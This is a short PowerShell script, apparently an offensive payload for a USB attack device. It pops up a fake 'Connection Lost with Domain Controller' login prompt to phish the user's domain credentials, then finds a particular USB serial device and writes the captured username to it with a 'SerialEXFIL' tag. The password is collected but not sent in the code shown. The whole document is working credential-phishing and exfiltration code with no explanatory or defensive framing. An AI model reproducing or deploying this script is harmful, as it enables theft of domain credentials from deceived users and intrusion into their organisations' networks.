function antani{
    [System.Reflection.Assembly]::LoadWithPartialName("System.web");
    $cred = $Host.ui.PromptForCredential("Connection Lost with Domain Controller", "Please login again", "$env:userdomain\$env:username","");
    $username = "$env:username"; $domain = "$env:userdomain"; $full = "$domain" + "\" + "$username"; $password = $cred.GetNetworkCredential().password;
    Add-Type -assemblyname System.DirectoryServices.AccountManagement;
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);
    $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password;
    $username = $output.UserName; $password = $output.password; $domain = $output.Domain; Send-Credentials($username, $password, $domain)
}
function Send-Credentials($username, $password, $domain){
    $username = [System.Web.HttpUtility]::UrlEncode($username); $s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like 'USB\\VID_1b4f&PID_9208%'").Caption; $com=[regex]::match($s,"\(([^\)]+)\)").Groups[1].Value; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine("SerialEXFIL:$username"); $port.Close(); exit;
}
